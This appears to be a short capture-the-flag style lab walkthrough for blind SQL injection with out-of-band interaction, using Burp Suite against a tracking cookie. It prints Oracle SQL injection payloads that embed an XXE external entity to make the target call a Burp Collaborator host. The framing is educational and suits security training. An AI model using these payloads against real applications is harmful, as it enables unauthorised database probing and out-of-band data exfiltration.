Step 1 : Intercept the request using BurpSuite Pro.

Step 2 : Modify the TrackingId cookie, changing it to a payload that will trigger an interaction with the Collaborator server. For example, you can combine SQL injection with basic XXE techniques as follows:
  ```
  ' UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual-- 
  ```
  
Step 3: Go to Burp Collaborator Client and copy the subdomain and paste it in payload. For eg:
   ```
   ' union SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://615l2lnatx5gf2wkh3dq2x9xtozen3.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual-- 
   ```
   
Step 4: Copy and paste it after TrakingId Cookie, the URL encode it then send.

Step 5: Now go to Burp Collaborator, and press 'Poll now'

Step 6: You will now see the DNS Lookup.
